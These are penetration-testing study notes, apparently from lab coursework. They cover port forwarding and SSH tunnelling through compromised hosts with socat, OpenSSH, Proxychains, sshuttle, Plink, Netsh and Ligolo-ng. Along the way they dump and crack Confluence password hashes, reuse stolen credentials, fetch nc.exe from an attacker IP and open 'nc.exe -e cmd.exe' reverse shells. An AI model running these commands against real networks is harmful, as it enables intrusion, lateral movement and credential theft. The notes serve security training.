# Port Redirection and SSH Tunneling

### Port Forwarding

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command. In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically-linked binary version instead.

We will use Socat to set up the port forward we want on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received onetn that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (-ddd) Socat process. It will listen on TCP port 2345 (TCP-LISTEN:2345), fork into a new subprocess when it receives a connection (fork) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (TCP:10.4.50.215:5432). We'll listen on port 2345 as it's not in the privileged port range (0-1024), which means we don't need elevated privileges to use it.

```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```

With the Socat process running, we can run psql on our Kali machine, specifying that we want to connect to CONFLUENCE01 (-h 192.168.50.63) on port 2345 (-p 2345) with the postgres user account (-U postgres). When prompted, we will enter the password, and once connected, we can run the \l command to list the available databases.

```bash
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
```

Using our new database access, we can continue our enumeration. In the confluence database, let's query the cwd_user table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the \c confluence command, then run select * from cwd_user; to review everything in that table.

```bash
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15
...
```

We receive several rows of user information. Each row contains data for a single Confluence user, including their password hash. We will use Hashcat to try to crack these.


```bash
hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt
```

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```bash
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the database_admin user, and the password we just cracked using Hashcat.

```bash
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
```

Keep in mind that there are several alternatives to socat. *rinetd* is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations, but is slightly unwieldy for temporary port forwarding solutions. We can combine Netcat and a FIFO named pipe file to create a port forward(https://gist.github.com/holly/6d52dd9addd3e58b2fd5). 

If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to /proc/sys/net/ipv4/conf/[interface]/forwarding (if it's not already configured to allow it).

### SSH Tunneling

At a high-level, tunneling describes the act of encapsulating one kind of data stream within another as it travels across a network. Certain protocols called tunneling protocols are designed specifically to do this. Secure Shell (SSH) is an example of one of these protocols.

SSH was initially developed to give administrators the ability to log in to their servers remotely through an encrypted connection. Before SSH, tools such as rsh, rlogin, and Telnet provided similar remote administration capabilities, but over an unencrypted connection.

In the background of each SSH connection, all shell commands, passwords, and data are transported through an encrypted tunnel built using the SSH protocol. The SSH protocol is primarily a tunneling protocol, so it's possible to pass almost any kind of data through an SSH connection. For that reason, tunneling capabilities are built into most SSH tools.

Another great benefit of SSH tunneling is how its use can easily blend into the background traffic of network environments. SSH is used often by network administrators for legitimate remote administration purposes, and flexible port forwarding setups in restrictive network situations. It's therefore common to find SSH client software already installed on Linux hosts, or even SSH servers running there. It's also increasingly common to find OpenSSH client software installed on Windows hosts. In network environments that are not heavily monitored, SSH traffic will not seem anomalous, and SSH traffic will look much like regular administrative traffic. Its contents also cannot be easily monitored.

### SSH Local Port Forwarding

With SSH local port forwarding, packets are not forwarded by the same host that listens for packets. Instead, an SSH connection is made between two hosts (an SSH client and an SSH server), a listening port is opened by the SSH client, and all packets received on this port are tunneled through the SSH connection to the SSH server. The packets are then forwarded by the SSH server to the socket we specify.

*Let's reconsider the previous scenario with a slight modification: Socat is no longer available on CONFLUENCE01. We still have all the credentials we previously cracked from the Confluence database, and there is still no firewall preventing us from connecting to the ports we bind on CONFLUENCE01.*

With the database_admin credentials, we'll log in to PGDATABASE01 and find that it's attached to another internal subnet. We find a host with a Server Message Block (SMB) server open (on TCP port 445) in that subnet. We want to be able to connect to that server and download what we find to our Kali machine.

In this type of scenario, we'll plan to create an SSH local port forward as part of our SSH connection from CONFLUENCE01 to PGDATABASE01. We will bind a listening port on the WAN interface of CONFLUENCE01. All packets sent to that port will be forwarded through the SSH tunnel. PGDATABASE01 will then forward these packets toward the SMB port on the new host we found.

When setting up an SSH local port forward, we need to know exactly which IP address and port we want the packets forwarded to. So before we create the port forward SSH connection, let's SSH into PGDATABASE01 from CONFLUENCE01 to start enumerating.

In our shell from CONFLUENCE01, we'll make sure we have TTY functionality by using the Python 3's pty module. We can then SSH into PGDATABASE01 with the database_admin credentials.

Now that we have an SSH connection to PGDATABASE01 from CONFLUENCE01, we can start enumerating. We'll run ip addr to query available network interfaces. We'll then run ip route to discover what subnets are already in the routing table.

```bash
ip a
ip route
```

We don't find a port scanner installed on PGDATABASE01; however, we can still do some initial reconnaissance with the tools that are available. Let's write a Bash for loop to sweep for hosts with an open port 445 on the /24 subnet. We can use Netcat to make the connections, passing the -z flag to check for a listening port without sending data, -v for verbosity, and -w set to 1 to ensure a lower time-out threshold.

```bash
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
```

We want to be able to enumerate the SMB service on this host. If we find anything, we want to download it directly to our Kali machine for inspection. There are at least two ways we could do this.

One way is to use whatever built-in tools we find on PGDATABASE01. However, if we did find anything, we would have to download it to PGDATABASE01, then transfer it back to CONFLUENCE01, then back to our Kali machine. This would create quite a tedious manual data transfer process.

The alternative is to use SSH local port forwarding. We could create an SSH connection from CONFLUENCE01 to PGDATABASE01. As part of that connection, we could create an SSH local port forward. This would listen on port 4455 on the WAN interface of CONFLUENCE01, forwarding packets through the SSH tunnel out of PGDATABASE01 and directly to the SMB share we found. We could then connect to the listening port on CONFLUENCE01 directly from our Kali machine.

In this scenario, there still is no firewall preventing us from accessing ports that we bind on the WAN interface of CONFLUENCE01. In later sections, we will put the firewall up, and use more advanced techniques to traverse this boundary.

A local port forward can be set up using OpenSSH's -L option, which takes two sockets (in the format IPADDRESS:PORT) separated with a colon as an argument (e.g. IPADDRESS:PORT:IPADDRESS:PORT). The first socket is the listening socket that will be bound to the SSH client machine. The second socket is where we want to forward the packets to. The rest of the SSH command is as usual - pointed at the SSH server and user we wish to connect as.

Let's create the SSH connection from CONFLUENCE01 to PGDATABASE01 using ssh, logging in as database_admin. We'll pass the local port forwarding argument we just put together to -L, and use -N to prevent a shell from being opened.

```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```

Once we've entered the password, we don't receive any output. When running SSH with the -N flag, this is normal. The -N flag prevents SSH from executing any remote commands, meaning we will only receive output related to our port forward.

If the SSH connection or the port forwarding fails for some reason, and the output we get from the standard SSH session isn't sufficient to troubleshoot it, we can pass the -v flag to ssh in order to receive debug output.

Since this reverse shell from CONFLUENCE01 is now occupied with an open SSH session, we need to catch another reverse shell from CONFLUENCE01. We can do this by listening on another port and modifying our CVE-2022-26134 payload to return a shell to that port.

Once we have another reverse shell from CONFLUENCE01, we can confirm that the ssh process we just started from our other shell is listening on 4455 using ss:

```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ ss -ntplu 
ss -ntplu
Netid  State   Recv-Q  Send-Q         Local Address:Port     Peer Address:Port  Process                                                                         
udp    UNCONN  0       0              127.0.0.53%lo:53            0.0.0.0:*
tcp    LISTEN  0       128                  0.0.0.0:4455          0.0.0.0:*      users:(("ssh",pid=59288,fd=4))
...
```

Connecting to port 4455 on CONFLUENCE01 will now be just like connecting directly to port 445 on 172.16.50.217. We can review the connection flow in the following diagram.

We can now interact with port 4455 on CONFLUENCE01 from our Kali machine. Let's start by listing the available shares with smbclient's -L option, passing 4455 to the custom port -p option, along with the username to the -U option and the password to the --password option. We'll try the credentials we cracked for the hr_admin user from the Confluence database.

```bash
kali@kali:~$ smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
kali@kali:~$ smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234
smb: \> get Provisioning.ps1
```

### SSH Dynamic Port Forwarding

Local port forwarding has one glaring limitation: we can only connect to one socket per SSH connection. This can make it quite tedious to use at scale. Luckily, OpenSSH also provides dynamic port forwarding. From a single listening port on the SSH client, packets can be forwarded to any socket that the SSH server host has access to.

SSH dynamic port forwarding works because the listening port that the SSH client creates is a SOCKS proxy server port. SOCKS is a proxying protocol. Much like a postal service, a SOCKS server accepts packets (with a SOCKS protocol header) and forwards them on to wherever they're addressed.

This is powerful. In SSH dynamic port fowarding, packets can be sent to a single listening SOCKS port on the SSH client machine. These will be pushed through the SSH connection, then forwarded to anywhere the SSH server machine can route. The only limitation is that the packets have to be properly formatted - most often by SOCK-compatible client software. In some cases, software is not SOCKS-compatible by default. We will work through this limitation later in this section.

Let's extend the previous scenario. As well as connecting to the SMB port on HRSHARES, we also want to be able to do a full portscan of HRSHARES.

We can ensure that we're in a TTY shell using Python3's pty module. We will create our SSH connection to PGDATABASE01 using the database_admin credentials again. In OpenSSH, a dynamic port forward is created with the -D option. The only argument this takes is the IP address and port we want to bind to. In this case, we want it to listen on all interfaces on port 9999. We don't have to specify a socket address to forward to. We'll also pass the -N flag to prevent a shell from being spawned.

```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<in$ python3 -c 'import pty; pty.spawn("/bin/bash")'

confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```

As we did earlier, let's connect to port 445 on HRSHARES. However, this time we will do it through the SOCKS proxy port created by our SSH dynamic port forward command.

To accomplish this, we'll want to use smbclient again. However, we find that smbclient doesn't natively provide an option to use a SOCKS proxy. Without a native option to use a SOCKS proxy in smbclient, we can't take advantage of our dynamic port forward. The SOCKS proxy can't determine how to handle traffic that isn't encapsulated in the SOCKS protocol format.

*To use smbclient in this situation, we'll leverage Proxychains.4 Proxychains is a tool that can force network traffic from third party tools over HTTP or SOCKS proxies. As the name suggests, it can also be configured to push traffic over a chain of concurrent proxies.*

The way Proxychains works is a light hack. It uses the Linux shared object preloading technique (LD_PRELOAD) to hook libc networking functions within the binary that gets passed to it, and forces all connections over the configured proxy server. This means it might not work for everything, but will work for most dynamically-linked binaries that perform simple network operations. It won't work on statically-linked binaries.

Proxychains uses a configuration file for almost everything, stored by default at /etc/proxychains4.conf. We need to edit this file to ensure that Proxychains can locate our SOCKS proxy port, and confirm that it's a SOCKS proxy (rather than any other kind of proxy). By default, proxies are defined at the end of the file. We can simply replace any existing proxy definition in that file with a single line defining the proxy type, IP address, and port of the SOCKS proxy running on CONFLUENCE01 (socks5 192.168.50.63 9999).

Although we specify socks5 in this example, it could also be socks4, since SSH supports both. SOCKS5 supports authentication, IPv6, and User Datagram Protocol (UDP), including DNS. Some SOCKS proxies will only support the SOCKS4 protocol. Make sure you check which version is supported by the SOCKS server when using SOCKS proxies in engagements.

With Proxychains configured, we can now list the available shares on HRSHARES using smbclient from our Kali machine. Rather than connecting to the port on CONFLUENCE01, we'll write the smbclient command as though we have a direct connection to PGDATABASE01. As before, we will specify -L to list the available shares, pass the username with -U, and password with --password. Next, we can simply prepend proxychains to the command. Proxychains will read the configuration file, hook into the smbclient process, and force all traffic through the SOCKS proxy we specified.

```bash
kali@kali:~$ proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```

Let's escalate this and port scan HRSHARES through our SOCKS proxy using Nmap. We'll use a TCP-connect scan (-sT), skip DNS resolution (-n), skip the host discovery stage (-Pn) and only check the top 20 ports (--top-ports=20). We will then prepend proxychains to the command again to push all packets through the SSH dynamic port forward SOCKS proxy. We'll also increase the verbosity using -vvv.

```bash
kali@kali:~$ proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
```

By default, Proxychains is configured with very high time-out values. This can make port scanning really slow. Lowering the tcp_read_time_out and tcp_connect_time_out values in the Proxychains configuration file will force Proxychains to time-out on non-responsive connections more quickly. This can dramatically speed up port-scanning times.

### SSH Remote Port Forwarding

In our examples so far, we've been able to connect to any port we bind on the WAN interface of CONFLUENCE01. This is more challenging in the real world because, more often than not, firewalls - both hardware and software - are likely to get in the way. Inbound traffic is often controlled much more aggressively than outbound traffic. Only in rare cases will we compromise credentials for an SSH user, allowing us to SSH directly into a network and port forward. We will only very rarely be able to access ports that we bind to a network perimeter.

However, we will more often be able to SSH out of a network. Outbound connections are more difficult to control than inbound connections. Most corporate networks will allow many types of common network traffic out - including SSH - for reasons of simplicity, usability, and business need. So while it likely won't be possible to connect to a port we bind to the network perimeter, it will often be possible to SSH out.

While in local and dynamic port forwarding, the listening port is bound to the SSH client, in remote port forwarding, the listening port is bound to the SSH server. Instead of the packet forwarding being done by the SSH server, in remote port forwarding, packets are forwarded by the SSH client.

As before, we compromise CONFLUENCE01 using CVE-2022-26134. However, in this scenario, the administrators decided to improve network security by implementing a firewall at the perimeter. The firewall is configured so that, regardless of whether we bind a port on the WAN interface of CONFLUENCE01 or not, the only port we can connect to from our Kali machine is TCP 8090.

However, CONFLUENCE01 does have an SSH client, and we can set up an SSH server on our Kali machine. 

We can connect from CONFLUENCE01 to our Kali machine over SSH. The listening TCP port 2345 is bound to the loopback interface on our Kali machine. Packets sent to this port are pushed by the Kali SSH server software through the SSH tunnel back to the SSH client on CONFLUENCE01. They are then forwarded to the PostgreSQL database port on PGDATABASE01.

```bash
sudo systemctl start ssh
sudo ss -ntplu
```

In order to connect back to the Kali SSH server using a username and password you may have to explicity allow password-based authentication by setting PasswordAuthentication to yes in /etc/ssh/sshd_config.

Once we have a reverse shell from CONFLUENCE01, we ensure we have a TTY shell, then create an SSH remote port forward as part of an SSH connection back to our Kali machine.

The SSH remote port forward option is -R, and has a very similar syntax to the local port forward option. It also takes two socket pairs as the argument. The listening socket is defined first, and the forwarding socket is second.

In this case, we want to listen on port 2345 on our Kali machine (127.0.0.1:2345), and forward all traffic to the PostgreSQL port on PGDATABASE01 (10.4.50.215:5432).

```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<in$ python3 -c 'import pty; pty.spawn("/bin/bash")'

confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

We can now start probing port 2345 on the loopback interface of our Kali machine, as though we're probing the PostgreSQL database port on PGDATABASE01 directly. On our Kali machine, we will use psql, passing 127.0.0.1 as the host (-h), 2345 as the port (-p), and using the database credentials of the postgres user (-U) we found earlier on CONFLUENCE01.

```bash
kali@kali:~$ psql -h 127.0.0.1 -p 2345 -U postgres
postgres=# \l
D@t4basePassw0rd!
```

### SSH Remote Dynamic Port Forwarding

With remote port forwarding, we were able to forward packets to one socket per SSH connection. However, just as we found with local port forwarding, this single-socket-per-connection limitation can slow us down. We often want more flexibility when attacking networks, especially in the enumeration stages.

Luckily, remote dynamic port forwarding can provide this flexibility. Just as the name suggests, remote dynamic port forwarding creates a dynamic port forward in the remote configuration. The SOCKS proxy port is bound to the SSH server, and traffic is forwarded from the SSH client.

Remote dynamic port forwarding is just another instance of dynamic port forwarding, so we gain all the flexibility of traditional dynamic port forwarding alongside the benefits of the remote configuration. We are able to connect to any port on any host that CONFLUENCE01 has access to by passing SOCKS-formatted packets through the SOCKS proxy port that is bound on our Kali machine.

Remote dynamic port forwarding has only been available since October 2017's OpenSSH 7.6. Despite this, only the OpenSSH client needs to be version 7.6 or above to use it - the server version doesn't matter.

Let extend our scenario again. This time we find a Windows server (MULTISERVER03) on the DMZ network. The firewall prevents us from connecting to any port on MULTISERVER03, or any port other than TCP/8090 on CONFLUENCE01 from our Kali machine. But we can SSH out from CONFLUENCE01 to our Kali machine, then create a remote dynamic port forward so we can start enumerating MULTISERVER03 from Kali.

The SSH session is initiated from CONFLUENCE01, connecting to the Kali machine, which is running an SSH server. The SOCKS proxy port is then bound to the Kali machine on TCP/9998. Packets sent to that port will be pushed back through the SSH tunnel to CONFLUENCE01, where they will be forwarded based on where they're addressed - in this case, MULTISERVER03.

Once we have a reverse shell from CONFLUENCE01, have spawned a TTY shell within it, and have enabled SSH on our Kali machine, we can start crafting the remote dynamic port forwarding command.

The remote dynamic port forwarding command is relatively simple, although (slightly confusingly) it uses the same -R option as classic remote port forwarding. The difference is that when we want to create a remote dynamic port forward, we pass only one socket: the socket we want to listen on the SSH server. We don't even need to specify an IP address; if we just pass a port, it will be bound to the loopback interface of the SSH server by default.

To bind the SOCKS proxy to port 9998 on the loopback interface of our Kali machine, we simply specify -R 9998 to the SSH command we run on CONFLUENCE01. We'll also pass the -N flag to prevent a shell from being opened.

```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<in$ python3 -c 'import pty; pty.spawn("/bin/bash")'

confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -R 9998 kali@192.168.118.4
```

```bash
kali@kali:~$ sudo ss -ntplu # Verify it's working
kali@kali:~$ tail /etc/proxychains4.conf # Verify proxychains is configured correctly
...
# defaults set to "tor"
socks5 127.0.0.1 9998
kali@kali:~$ proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
```

Scanning is a little slower against this Windows host - likely due to the different way the Windows firewall responds when a port is closed compared to Linux.


HOW TO FIND ANOTHER SERVER'S INTERNAL INTERFACE [IP]???

### Using sshuttle

In situations where we have direct access to an SSH server, behind which is a more complex internal network, classic dynamic port forwarding might be difficult to manage. sshuttle is a tool that turns an SSH connection into something similar to a VPN by setting up local routes that force traffic through the SSH tunnel. However, it requires root privileges on the SSH client and Python3 on the SSH server, so it's not always the most lightweight option. In the appropriate scenario, however, it can be very useful.

In our lab environment, we have SSH access to PGDATABASE01, which we can access through a port forward set up on CONFLUENCE01. Let's run sshuttle through this to observe its capabilities.

First, we can set up a port forward in a shell on CONFLUENCE01, listening on port 2222 on the WAN interface and forwarding to port 22 on PGDATABASE01.

```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```

```bash
kali@kali:~$ sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
```

Although we don't receive much output from sshuttle, in theory, it should have set up the routing on our Kali machine so that any requests we make to hosts in the subnets we specified will be pushed transparently through the SSH connection. Let's test if this is working by trying to connect to the SMB share on HRSHARES in a new terminal.

```bash
kali@kali:~$ smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```

##  Port Forwarding with Windows Tools

The OpenSSH client has been bundled with Windows by default since version 1803 (April 2018 Update). On Windows versions with SSH installed, we will find scp.exe, sftp.exe, ssh.exe, along with other ssh-* utilities in %systemdrive%\Windows\System32\OpenSSH location by default.

The fact that the SSH client is compiled for Windows doesn't mean that we can only connect to Windows-compiled SSH servers. We can connect to any SSH server we want - as long as we have the credentials.

Let's practice this by creating a remote dynamic port forward from MULTISERVER03 (a Windows machine) to our Kali machine. In this scenario, only the RDP port is open on MULTISERVER03. We can RDP in, but we can't bind any other ports to the WAN interface.

We will use the rdp_admin credentials we found earlier to RDP into the server. We'll then use ssh.exe to create a remote dynamic port forward connection to our Kali machine. We can then use that to connect to the PostgreSQL database service on PGDATABASE01.

```bash
kali@kali:~$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64
```

```bash
C:\Users\rdp_admin>where ssh
C:\Windows\System32\OpenSSH\ssh.exe
C:\Users\rdp_admin>ssh.exe -V
OpenSSH_for_Windows_8.1p1, LibreSSL 3.0.2
C:\Users\rdp_admin>ssh -N -R 9998 kali@192.168.118.4
```

```bash
kali@kali:~$ ss -ntplu
kali@kali:~$ tail /etc/proxychains4.conf  
```

Now that the configuration file is pointing at our remote dynamic port forward SOCKS port, we can run psql through proxychains to connect to the PostgreSQL database as the postgres user. We'll use the same psql command we would as if connecting directly from MULTISERVER03.

```bash
kali@kali:~$ proxychains psql -h 10.4.50.215 -U postgres  
```

### Port Forwarding with Windows Tools

On Windows versions with SSH installed, we will find scp.exe, sftp.exe, ssh.exe, along with other ssh-* utilities in %systemdrive%\Windows\System32\OpenSSH location by default.

If the version of ssh is higher than 7.6, you can use it for remote dynamic port forwarding. You can check with "ssh.exe -V".

#### Plink

If ssh isn't installed on the machine, check if Plink is. Note that Plink can be used without a GUI, though remote dynamic port forwarding is not possible. Also note that there are alternatives to Plink.

```bash
sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
...
powershell wget -Uri http://192.168.45.182/nc.exe -OutFile C:\Windows\Temp\nc.exe
...
nc -lvnp 4446
...
C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.182 4446

```

This is a remote port forward, where we can access a remote machine's RDP port 3389 on our own loopback interface:

**This might log our Kali password somewhere undesirable! If we're in a hostile network, we may wish to create a port-forwarding only user on our Kali machine for remote port forwarding situations.**

```bash
\c:\windows\system32\inetsrv>C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

**Much the same way that it's not possible to accept the SSH client key cache prompt from a non-TTY shell on Linux, with some very limited shells with Plink on Windows, we also won't be able to respond to this prompt. An easy solution in that case would be to automate the confirmation with cmd.exe /c echo y, piped into the plink.exe command. This will emulate the confirmation that we usually type when prompted. The entire command would be:**

```bash
cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw password -R 127.0.0.1:9833:127.0.0.1:3389 192.168.69.182
```

You can now RDP into the previously blocked RDP port:

```bash
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
```

**Local port forwards allow you to access what's on a remote machine's loopback on your own. Remote port forwarding allows you to access a remote machine's blocked port on your own loopback.**


#### Netsh

Native to Windows, typically used as a built-in firewall configurartion tool.

Let's consider a slight modification of the previous scenario. MULTISERVER03 is serving its web application on TCP port 80 on the perimeter. CONFLUENCE01 is no longer accessible on the WAN interface. For simplicity, the firewall on MULTISERVER03 also allows inbound TCP port 3389, meaning we are able to log in over RDP directly.

We want to SSH into PGDATABASE01 directly from our Kali machine. To do this, we'll need to create a port forward on MULTISERVER03 that will listen on the WAN interface and forward packets to the SSH port on PGDATABASE01.

The portproxy subcontext of the netsh interface command requires administrative privileges to make any changes. This means that in most cases we will need to take UAC into account. In this example, we're running it in a shell over RDP using an account with administrator privileges, so UAC is not a concern. However, we should bear in mind that UAC may be a stumbling block in other setups.

To start setting up a port forward, let's RDP directly into MULTISERVER03 from our Kali machine using xfreerdp again:

```bash
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64
```

In our RDP session, we can run cmd.exe as administrator to open a command window.

Using this window, we can run Netsh. We'll instruct **netsh interface** to **add** a **portproxy** rule from an IPv4 listener that is forwarded to an IPv4 port (**v4tov4**). This will listen on port 2222 on the external-facing interface (**listenport=2222** **listenaddress=192.168.50.64**) and forward packets to port 22 on PGDATABASE01 (**connectport=22** **connectaddress=10.4.50.215**).

```bash
C:\Windows\system32>netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215

C:\Windows\system32>
```

Although we don't receive any output from the command, we can confirm that port 2222 is listening using netstat.

```bash
C:\Windows\system32>netstat -anp TCP | find "2222"
  TCP    192.168.50.64:2222     0.0.0.0:0              LISTENING

C:\Windows\system32>
```

We can also confirm that the port forward is stored by issuing the show all command in the netsh interface portproxy subcontext.

```bash
C:\Windows\system32>netsh interface portproxy show all

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
192.168.50.64   2222        10.4.50.215     22
```

However, there's a problem. We can't connect to port 2222 from our Kali machine. You can check nmap to confirm:

```bash
sudo nmap -sS 192.168.50.64 -Pn -n -p2222
```

In order to access it, we need to poke a hole in the firewall on MULTISERVER03. *We'll also need to remember to plug that hole as soon as we're finished with it!*

We can use the netsh advfirewall firewall subcontext to create the hole. We will use the add rule command and name the rule "port_forward_ssh_2222". We need to use a memorable or descriptive name, because we'll use this name to delete the rule later on.

We'll allow connections on the local port (localport=2222) on the interface with the local IP address (localip=192.168.50.64) using the TCP protocol, specifically for incoming traffic (dir=in).

```bash
C:\Windows\system32> netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
Ok.
```

The port is open! We can now SSH to port 2222 on MULTISERVER03, as though connecting to port 22 on PGDATABASE01.

```bash
kali@kali:~$ ssh database_admin@192.168.50.64 -p2222
...
database_admin@pgdatabase01:~$
```

Great! We're SSH'd into PGDATABASE01 through a port forward set up on MULTISERVER03 using Netsh.

Using netsh advfirewall firewall, we can delete the rule, referencing it by its catchy name: "port_forward_ssh_2222":

```bash
C:\Users\Administrator>netsh advfirewall firewall delete rule name="port_forward_ssh_2222"

Deleted 1 rule(s).
Ok.
```

We can also delete the port forward we created. This time we'll use the netsh interface subcontext to del the portproxy we created. We will reference the forwarding type (v4tov4) and the listenaddress and listenport we used when creating the rule, so Netsh can determine which rule to delete.

```bash
C:\Windows\Administrator> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```

Most Windows Firewall commands have PowerShell equivalents with commandlets like New-NetFirewallRule and Disable-NetFirewallRule. However, the netsh interface portproxy command doesn't. For simplicity, we've stuck with pure Netsh commands in this section. However, for a lot of Windows Firewall enumeration and configuration, PowerShell is extremely useful. You may wish to experiment with it while completing the exercises for this section.

In this section, we created a port forward on Windows using the Netsh command. We also created a firewall rule to allow inbound traffic on our listening port. We used these in conjunction to create a working port forward from the WAN interface of MULTISERVER03 to the SSH server of PGDATABASE01.

### Ligolo-ng

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
/opt/proxy -selfcert
```

On the other machine:

```bash
agent.exe -connect 192.168.49.140:11601 -ignore-cert
```

On your machine:

```bash
session # select the session that you want to work with
1
```

Add a rule to your iptables, another terminal windows:

```bash
sudo ip route add 172.16.140.0/24 dev ligolo # interface 1
ip route list # confirm
nc -lvnp 4444
```

Back on the ligolo terminal:

```bash
start
```

In order to receive reverse shells from machines on the internal network:

```bash
listener_add --addr 0.0.0.0:3389 --to 127.0.0.1:3389
listener-list # confirm
ifconfig # get the INTERNAL ip address, which will be used to communicate to your personal kali machine on the external network
```

On your internal Windows machine:

```bash
nc.exe 172.16.157.14 1234 -e cmd.exe
```

In order to transfer files from your machine to the internal server:

In the ligolo terminal:

```bash
# Add another listener that directs to your server
listener-add --addr 0.0.0.0:1235 --to 127.0.0.1:8000
```

You may need to create certificates:

```bash
mkdir -p ~/Downloads/certs
cd ~/Downloads/certs
openssl req -newkey rsa:2048 -new -nodes -x509 -days 3650 -keyout key.pem -out cert.pem
```